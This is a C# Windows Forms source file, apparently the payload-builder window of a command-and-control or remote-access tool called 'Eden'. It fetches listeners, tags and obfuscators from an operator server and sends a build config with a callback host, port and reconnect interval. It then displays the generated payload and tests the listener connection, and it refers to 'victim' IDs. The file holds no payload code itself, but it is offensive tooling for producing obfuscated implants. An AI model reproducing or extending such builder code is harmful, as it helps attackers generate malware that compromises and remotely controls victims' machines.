using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Text.Json;
using System.Net.Sockets;

namespace Eden
{
    public partial class frmBuild : Form
    {
        private clsClient m_clnt { get; init; }
        private List<clsListener> m_lsListener = new List<clsListener>();
        private Dictionary<string, clsListener> m_dicTemplate = new Dictionary<string, clsListener>();

        public frmBuild(clsClient clnt)
        {
            InitializeComponent();

            m_clnt = clnt;
            Text = "Builder";
        }

        private delegate void dlgSettingUpdated();
        private event dlgSettingUpdated SettingUpdated;
        private delegate void dlgInitializationFailed();
        private event dlgInitializationFailed InitializationFailed;

        internal class clsBuildConfig
        {
            public string tag { get; set; }
            public string host { get; set; }
            public int port { get; set; }
            public string template { get; set; }
            public int interval_info { get; set; }
            public int interval_reconn { get; set; }
            public string obfuscator { get; set; }
        }

        internal class clsListener
        {
            public string szName { get; set; }
            public string szTemplate { get; set; }
            public int nPort { get; set; }
        }

        void fnSettingUpdated()
        {
            if (comboBox1.Items.Count == 0)
                return;

            if (comboBox2.Items.Count == 0)
                return;

            if (comboBox3.Items.Count == 0)
                return;

            toolStripStatusLabel1.Text = "Initialization is completed.";
        }

        void fnInitializationFailed()
        {
            toolStripStatusLabel1.Text = "Failed";
        }

        void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (lsMsg[0] == "builder")
            {
                if (lsMsg[1] == "ls")
                {
                    if (lsMsg[2] == "tag")
                    {
                        int nCode = int.Parse(lsMsg[3]);
                        if (nCode == 1)
                        {
                            var ls = clsTools.EZData.String2OneDList(lsMsg[4]);
                            Invoke(() =>
                            {
                                foreach (var tag in ls)
                                    comboBox3.Items.Add(tag);

                                comboBox3.SelectedIndex = 0;

                                SettingUpdated?.Invoke();
                            });
                        }
                        else
                        {
                            MessageBox.Show(lsMsg[4], "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else if (lsMsg[2] == "listener")
                    {
                        int nCode = int.Parse(lsMsg[3]);
                        if (nCode == 1)
                        {
                            var ls = clsTools.EZData.String2TwoDList(lsMsg[4]);
                            m_lsListener.AddRange(ls.Select(x => new clsListener() { szName = x[0], szTemplate = x[1], nPort = int.Parse(x[2]) }));
                            Invoke(() =>
                            {
                                foreach (var listener in m_lsListener)
                                {
                                    comboBox1.Items.Add(listener.szName);
                                    m_dicTemplate.Add(listener.szName, listener);
                                }

                                comboBox1.SelectedIndex = 0;

                                SettingUpdated?.Invoke();
                            });
                        }
                        else
                        {
                            MessageBox.Show(lsMsg[4], "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else if (lsMsg[2] == "obfuscator")
                    {
                        int nCode = int.Parse(lsMsg[3]);
                        if (nCode == 1)
                        {
                            var ls = clsTools.EZData.String2OneDList(lsMsg[4]);
                            Invoke(() =>
                            {
                                foreach (var obfus in ls)
                                    comboBox2.Items.Add(obfus);

                                comboBox2.SelectedIndex = 0;
                                SettingUpdated?.Invoke();
                            });
                        }
                        else
                        {
                            MessageBox.Show(lsMsg[4], "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
                else if (lsMsg[1] == "payload")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    string szOutput = lsMsg[3];

                    if (nCode == 0)
                    {
                        MessageBox.Show(szOutput, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    else
                    {
                        Invoke(() =>
                        {
                            frmShowPayload f = new frmShowPayload();
                            f.Show();

                            f.fnShowPayload(szOutput);
                        });
                    }
                }
            }
        }

        private void fnSetup()
        {
            m_clnt.ServerMessageReceived += fnRecv;
            SettingUpdated += fnSettingUpdated;

            textBox1.Text = m_clnt.m_szSrvIP;
            toolStripStatusLabel1.Text = "Initializing, please wait...";

            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
            comboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
            comboBox3.DropDownStyle = ComboBoxStyle.DropDownList;

            m_clnt.fnSendCommand(new string[]
            {
                "builder",
                "ls",
                "tag",
            });
            m_clnt.fnSendCommand(new string[]
            {
                "builder",
                "ls",
                "listener",
            });
            m_clnt.fnSendCommand(new string[]
            {
                "builder",
                "ls",
                "obfuscator",
            });
        }

        private void frmBuild_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            var listener = m_dicTemplate.Values.ToList();
            numericUpDown1.Value = listener[comboBox1.SelectedIndex].nPort;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                var cls = new clsBuildConfig()
                {
                    template = m_dicTemplate[comboBox1.Text].szTemplate,

                    host = textBox1.Text,
                    port = (int)numericUpDown1.Value,

                    tag = comboBox3.Text,
                    obfuscator = comboBox2.Text,

                    interval_info = (int)numericUpDown2.Value,
                    interval_reconn = (int)numericUpDown3.Value,
                };

                string szJson = JsonSerializer.Serialize(cls);
                m_clnt.fnSendCommand(new string[]
                {
                    "builder",
                    "build",
                    szJson,
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void frmBuild_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= fnRecv;
            SettingUpdated -= fnSettingUpdated;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string szIPv4 = textBox1.Text;
            int nPort = (int)numericUpDown1.Value;

            _ = Task.Run(() =>
            {
                try
                {
                    Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sock.Connect(szIPv4, nPort);
                    sock.Close();

                    MessageBox.Show("Connect successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });
        }
    }
}
